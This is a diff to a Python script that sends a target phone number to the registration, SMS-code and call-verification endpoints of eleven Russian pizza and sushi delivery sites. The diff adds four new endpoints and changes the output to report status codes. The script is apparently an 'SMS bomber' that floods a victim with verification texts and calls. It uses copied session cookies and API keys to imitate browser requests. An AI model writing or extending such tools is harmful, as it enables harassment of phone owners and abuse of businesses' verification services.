@@ -26,9 +26,9 @@ def serv1():
             'phone': PHONE,
         }
         response = requests.post('https://api.hans-pizza.ru/api/auth/send', headers=headers, json=json_data)
-        print(response.json())
+        print(f"serv1 - {response.status_code}")
     except:
-        print("serv1")
+        print(f"serv1 - error")
 def serv2():
     try:
         cookies = {
@@ -68,9 +68,9 @@ def serv2():
         data = f'phone=%2B{PHONE[0]}+({PHONE[1:4]})+{PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}&action=send&call=Y&zone=Asia%2FYekaterinburg'
         print(data)
         response = requests.post('https://lv-pizza.ru/ajax/sms_new.php', cookies=cookies, headers=headers, data=data)
-        print(response.json())
+        print(f"serv2 - {response.status_code}")
     except:
-        print("serv2")
+        print(f"serv2 - error")
 def serv3():
     try:
         cookies = {
@@ -108,9 +108,9 @@ def serv3():
             'lang': 'ru',
         }
         response = requests.post('https://api.papajohns.ru/v2/user/signup-by-phone', cookies=cookies, headers=headers, json=json_data)
-        print(response.json())
+        print(f"serv3 - {response.status_code}")
     except:
-        print("serv3")
+        print(f"serv3 - error")
 def serv4():
     try:
         cookies = {
@@ -125,6 +125,8 @@ def serv4():
         headers = {
             'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
             'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
+
+            
             'Connection': 'keep-alive',
             'Content-Type': 'application/json',
             'Origin': 'https://tochka-vkusa.ru',
@@ -144,9 +146,9 @@ def serv4():
             'passwordReply': 'Fadka333',
         }
         response = requests.put('https://tochka-vkusa.ru/api/registration', cookies=cookies, headers=headers, json=json_data)
-        print(response.json())
+        print(f"serv4 - {response.status_code}")
     except:
-        print("serv4")
+        print(f"serv4 - error")
 def serv5():
     try:
         cookies = {
@@ -180,9 +182,9 @@ def serv5():
         }
 
         response = requests.put('https://arigatosurgut.com/api/registration', cookies=cookies, headers=headers, json=json_data)
-        print(response.json())
+        print(f"serv5 - {response.status_code}")
     except:
-        print("serv5")
+        print(f"serv5 - error")
 def serv6():
     try:
         cookies = {
@@ -230,9 +232,9 @@ def serv6():
         }
 
         response = requests.post('https://tichpizza.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
-        print(response.json())
+        print(f"serv6 - {response.status_code}")
     except:
-        print("serv6")
+        print(f"serv6 - error")
 def serv7():
     try:
         cookies = {
@@ -289,9 +291,210 @@ def serv7():
         }
 
         response = requests.post('https://www.pizzaldo.ru/catalog/pizza/', params=params, cookies=cookies, headers=headers, data=data)
-        print(response.json())
+        print(f"serv7 - {response.status_code}")
     except:
-        print("serv7")
+        print(f"serv7 - error")
+def serv8():
+    try:
+        cookies = {
+        'uuid': '556a6caa-fdd1-f002-9704-1be2051fb550',
+        'encodedIP': 'dKlKmBfXaAnAmTbSlOfFoLrTgN',
+        'i18n_redirected': 'ru',
+        'theme': 'light',
+        'city_id': '60',
+        'department_id': '0',
+        'delivery_type': 'delivery',
+        '_ym_uid': '1775135708723440957',
+        '_ym_d': '1775135708',
+        'tmr_lvid': '636973f61f188fa24003f59cc8b6b744',
+        'tmr_lvidTS': '1775135707609',
+        '_ym_isad': '2',
+        '__session__id': '6460009169ce6bd93d5cb0.50399316',
+        'domain_sid': 'O4UN968KOKvx2u9-VTP2j%3A1775135708859',
+        'is_city-confirmed': 'true',
+        'tmr_detect': '0%7C1775135710170',
+        }
+
+        headers = {
+            'accept': 'application/json',
+            'accept-language': 'ru',
+            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=dc9b701a50aa4f74885b469dcaeffca2,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=false,sentry-sample_rand=0.6053204409537386,sentry-sample_rate=0.25',
+            'content-type': 'application/json',
+            'origin': 'https://rolik-sushi.ru',
+            'priority': 'u=1, i',
+            'referer': 'https://rolik-sushi.ru/omsk?utm_term=goulash_direct&etext=2202.r2YfmGR1fzjzhdvQX-PAOfcPRJujYlPm980bRweI2-_YaCVYhCpRplzYjJdq2_GfcmV6anp4ZHl4c25hdm1mcA.94bac8f389da08993f7428b51f2e2e673001c29c&yclid=2968623337557458943&ybaip=1',
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'sentry-trace': 'dc9b701a50aa4f74885b469dcaeffca2-a871caad08907b7e-0',
+            'sitenew': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+            'uuid': '556a6caa-fdd1-f002-9704-1be2051fb550',
+            'x-api-key': '9649494',
+            'x-brand-id': '1',
+            'x-platform': 'ssr',
+            # 'cookie': 'uuid=556a6caa-fdd1-f002-9704-1be2051fb550; encodedIP=dKlKmBfXaAnAmTbSlOfFoLrTgN; i18n_redirected=ru; theme=light; city_id=60; department_id=0; delivery_type=delivery; _ym_uid=1775135708723440957; _ym_d=1775135708; tmr_lvid=636973f61f188fa24003f59cc8b6b744; tmr_lvidTS=1775135707609; _ym_isad=2; __session__id=6460009169ce6bd93d5cb0.50399316; domain_sid=O4UN968KOKvx2u9-VTP2j%3A1775135708859; is_city-confirmed=true; tmr_detect=0%7C1775135710170',
+        }
+
+        json_data = {
+            'phone': PHONE[1:],
+            'verify_type': 'call',
+        }
+
+        response = requests.post('https://rolik-sushi.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
+        print(f"serv8 - {response.status_code}")
+    except:
+        print(f"serv8 - error")
+def serv9():
+    try:
+        cookies = {
+            'kbSession': '17751361399253470',
+            'kbCheck': '79fccb15cfbfc560005aa7548bbafd45',
+            'kbT': 'true',
+            'kbUserID': '164351970739166353',
+            '_ym_uid': '1775136141302752711',
+            '_ym_d': '1775136141',
+            '_ym_isad': '2',
+            '_ym_visorc': 'w',
+            'muSWLG': 'SBydcZwNjzeUKPMaDhXLbgOifVAWvY',
+            'SBydcZwNjzeUKPMaDhXLbgOifVAWvY': '33644fe01d6a913f44c994b4fdb993d8-1775136159-1775136155',
+            '_ga': 'GA1.1.73258741.1775136164',
+            'tmr_lvid': 'dfe62fa28a43783e7df24679fbf279d5',
+            'tmr_lvidTS': '1775136163910',
+            'domain_sid': 'xNGlW9RUrynkEuZlKwk-1%3A1775136164734',
+            'euCookiesAcc': 'true',
+            '_ga_D0D5B6TPCL': 'GS2.1.s1775136163$o1$g1$t1775136170$j53$l0$h0',
+            'tmr_detect': '0%7C1775136172775',
+            'muSWLG_hits': '7',
+        }
+
+        headers = {
+            'Accept': '*/*',
+            'Accept-Language': 'ru',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://rp55.ru',
+            'Referer': 'https://rp55.ru/cart/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+            'X-Requested-With': 'XMLHttpRequest',
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            # 'Cookie': 'kbSession=17751361399253470; kbCheck=79fccb15cfbfc560005aa7548bbafd45; kbT=true; kbUserID=164351970739166353; _ym_uid=1775136141302752711; _ym_d=1775136141; _ym_isad=2; _ym_visorc=w; muSWLG=SBydcZwNjzeUKPMaDhXLbgOifVAWvY; SBydcZwNjzeUKPMaDhXLbgOifVAWvY=33644fe01d6a913f44c994b4fdb993d8-1775136159-1775136155; _ga=GA1.1.73258741.1775136164; tmr_lvid=dfe62fa28a43783e7df24679fbf279d5; tmr_lvidTS=1775136163910; domain_sid=xNGlW9RUrynkEuZlKwk-1%3A1775136164734; euCookiesAcc=true; _ga_D0D5B6TPCL=GS2.1.s1775136163$o1$g1$t1775136170$j53$l0$h0; tmr_detect=0%7C1775136172775; muSWLG_hits=7',
+        }
+        formatted_phone = f"{PHONE[0]}({PHONE[1:4]}){PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}"
+        data = f"action=do_insert&phone={formatted_phone}&cookie=false"
+
+        response = requests.post('https://rp55.ru/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        print(f"serv9 - {response.status_code}")
+    except:
+        print(f"serv9 - error")
+def serv10():
+    try:
+        cookies = {
+            'uuid': '055561d5-1dca-d5c3-9cf8-2d6a13b1d252',
+            'encodedIP': 'dKlKmBfXaAnApFgItGuUlOiG',
+            'i18n_redirected': 'ru',
+            'theme': 'light',
+            'city_id': '1',
+            'department_id': '0',
+            'delivery_type': 'delivery',
+            '_ym_uid': '1775136658773893202',
+            '_ym_d': '1775136658',
+            '_ym_isad': '2',
+            'is_city-confirmed': 'true',
+            '__session__id': '103197001069ce6f8f3d6318.27721499',
+        }
+
+        headers = {
+            'accept': 'application/json',
+            'accept-language': 'ru',
+            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=abc6aa0e2efa455bbb35d58c807ea34f,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=true,sentry-sample_rand=0.19615489869961866,sentry-sample_rate=0.25',
+            'content-type': 'application/json',
+            'origin': 'https://barashka55.ru',
+            'priority': 'u=1, i',
+            'referer': 'https://barashka55.ru/omsk/shaurma?ysclid=mnhij4wxte268772195',
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'sentry-trace': 'abc6aa0e2efa455bbb35d58c807ea34f-aeea611756be9fb8-1',
+            'sitenew': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+            'uuid': '055561d5-1dca-d5c3-9cf8-2d6a13b1d252',
+            'x-api-key': '9300034',
+            'x-brand-id': '1',
+            'x-platform': 'ssr',
+            # 'cookie': 'uuid=055561d5-1dca-d5c3-9cf8-2d6a13b1d252; encodedIP=dKlKmBfXaAnApFgItGuUlOiG; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; _ym_uid=1775136658773893202; _ym_d=1775136658; _ym_isad=2; is_city-confirmed=true; __session__id=103197001069ce6f8f3d6318.27721499',
+        }
+
+        json_data = {
+            'phone': PHONE[1:],
+            'verify_type': 'call',
+        }
+
+        response = requests.post('https://barashka55.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
+        print(f"serv10 - {response.status_code}")
+    except:
+        print(f"serv10 - error")
+def serv11():
+    try:
+        cookies = {
+            '__js_p_': '579,1800,0,0,0',
+            '__jhash_': '229',
+            '__jua_': 'Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0',
+            '__hash_': '3dd857e7e18f7371e7a2131a6bb5f378',
+            '__lhash_': '1938cf45cb9e4face979b5d8ed62628d',
+            'NEXT_LOCALE': 'ru',
+            'utm_source': 'yandex.ru',
+            'utm_medium': 'organic',
+            'utm_campaign': 'yandex.ru',
+            'sessionId': '748295b6-1c9d-41c2-893c-eb8d785757d7',
+            '_ym_uid': '1775138586991868164',
+            '_ym_d': '1775138586',
+            '_ym_isad': '2',
+            '_ym_visorc': 'w',
+            'city': '%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%B2%D0%BE%D1%81%D1%82%D0%BE%D0%BA',
+        }
+
+        headers = {
+            'accept': 'application/json',
+            'accept-language': 'ru',
+            'authcode': '',
+            'content-type': 'application/json',
+            'lang': 'ru',
+            'origin': 'https://sicilian-pizzeria.ru',
+            'priority': 'u=1, i',
+            'referer': 'https://sicilian-pizzeria.ru/',
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'sessionid': '748295b6-1c9d-41c2-893c-eb8d785757d7',
+            'timezone': 'Asia/Yekaterinburg',
+            'uber-trace-id': '5dce35069c427a2763d75b7168f8fae0:33ad96c7928d9baa:0:1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+            # 'cookie': '__js_p_=579,1800,0,0,0; __jhash_=229; __jua_=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36%20Edg%2F146.0.0.0; __hash_=3dd857e7e18f7371e7a2131a6bb5f378; __lhash_=1938cf45cb9e4face979b5d8ed62628d; NEXT_LOCALE=ru; utm_source=yandex.ru; utm_medium=organic; utm_campaign=yandex.ru; sessionId=748295b6-1c9d-41c2-893c-eb8d785757d7; _ym_uid=1775138586991868164; _ym_d=1775138586; _ym_isad=2; _ym_visorc=w; city=%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%B2%D0%BE%D1%81%D1%82%D0%BE%D0%BA',
+        }
+
+        json_data = {
+            'phone': PHONE,
+        }
+
+        response = requests.post('https://sicilian-pizzeria.ru/api/auth/resetCode', cookies=cookies, headers=headers, json=json_data)
+        print(f"serv11 - {response.status_code}")
+    except:
+        print(f"serv11 - error")
 #serv1()
 #serv2()
 #serv3()
@@ -299,3 +502,7 @@ def serv7():
 #serv5()
 #serv6()
 #serv7()
+#serv8()
+#serv9()
+#serv10()
+#serv11()
